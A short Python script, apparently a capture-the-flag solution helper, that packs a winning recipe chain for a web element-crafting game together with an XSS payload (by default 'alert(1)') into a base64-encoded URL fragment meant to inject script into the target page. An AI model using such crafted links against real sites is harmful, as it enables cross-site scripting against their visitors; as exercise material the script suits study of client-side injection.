#!/usr/bin/env python3
import base64
import json

chain = [['Earth', 'Water'], ['Earth', 'Fire'], ['Air', 'Earth'], ['Air', 'Water'], ['Magma', 'Mist'], ['Magma', 'Mud'],
         ['Fire', 'Mud'], ['Fire', 'Mist'], ['Obsidian', 'Water'], ['Air', 'Rock'], ['Fog', 'Mud'],
         ['Hot Spring', 'Sludge'], ['Fire', 'Steam Engine'], ['Brick', 'Mud'], ['Hot Spring', 'Steam Engine'],
         ['Earth', 'Obsidian'], ['Brick', 'Fog'], ['Computer Chip', 'Steam Engine'], ['Dust', 'Heat Engine'],
         ['Adobe', 'Cloud'], ['Electricity', 'Software'], ['Computer Chip', 'Fire'],
         ['Artificial Intelligence', 'Data'], ['Encryption', 'Software'], ['Fire', 'Sand'], ['Internet', 'Program'],
         ['Glass', 'Software'], ['Cybersecurity', 'Vulnerability'], ['Exploit', 'Web Design']]


def build_state(xss: str) -> dict:
    """Build a state that has a satisfactory recipe and a given XSS payload"""
    assert len(xss) < 300, "XSS payload is too long"
    return {
        "recipe": chain,
        "xss": xss,
    }


def state_as_fragment(state: dict):
    """Return the given state as a URL fragment"""
    state_json = json.dumps(state)
    state_b64 = base64.b64encode(state_json.encode()).decode()
    return "#" + state_b64


def main():
    state = build_state("alert(1)")
    print(state_as_fragment(state))


if __name__ == "__main__":
    main()
